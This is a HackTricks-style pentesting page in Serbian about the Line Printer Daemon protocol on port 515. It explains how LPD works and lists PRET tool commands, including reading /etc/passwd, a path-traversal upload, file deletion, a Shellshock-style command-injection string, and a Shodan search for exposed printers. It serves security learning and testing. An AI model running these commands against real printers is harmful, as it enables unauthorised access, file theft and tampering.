{{#include ../banners/hacktricks-training.md}}

### **Uvod u LPD protokol**

U 1980-im, **Line Printer Daemon (LPD) protokol** je razvijen u Berkeley Unix-u, koji je kasnije formalizovan kroz RFC1179. Ovaj protokol funkcioniše preko porta 515/tcp, omogućavajući interakcije putem `lpr` komande. Suština štampanja putem LPD-a uključuje slanje **kontrolne datoteke** (za specifikaciju detalja posla i korisnika) zajedno sa **datotekom podataka** (koja sadrži informacije za štampanje). Dok kontrolna datoteka omogućava izbor **različitih formata datoteka** za datoteku podataka, rukovanje ovim datotekama određeno je specifičnom LPD implementacijom. Široko prepoznata implementacija za Unix-slične sisteme je **LPRng**. Važno je napomenuti da se LPD protokol može iskoristiti za izvršavanje **malicioznih PostScript** ili **PJL print poslova**.

### **Alati za interakciju sa LPD štampačima**

[**PRET**](https://github.com/RUB-NDS/PRET) uvodi dva osnovna alata, `lpdprint` i `lpdtest`, koji nude jednostavan način za interakciju sa LPD-kompatibilnim štampačima. Ovi alati omogućavaju niz akcija od štampanja podataka do manipulacije datotekama na štampaču, kao što su preuzimanje, otpremanje ili brisanje:
```python
# To print a file to an LPD printer
lpdprint.py hostname filename
# To get a file from the printer
lpdtest.py hostname get /etc/passwd
# To upload a file to the printer
lpdtest.py hostname put ../../etc/passwd
# To remove a file from the printer
lpdtest.py hostname rm /some/file/on/printer
# To execute a command injection on the printer
lpdtest.py hostname in '() {:;}; ping -c1 1.2.3.4'
# To send a mail through the printer
lpdtest.py hostname mail lpdtest@mailhost.local
```
Za pojedince koji su zainteresovani za dalju eksploraciju oblasti **hacking-a štampača**, sveobuhvatan resurs se može pronaći ovde: [**Hacking Printers**](http://hacking-printers.net/wiki/index.php/Main_Page).

# Shodan

- `port 515`

{{#include ../banners/hacktricks-training.md}}
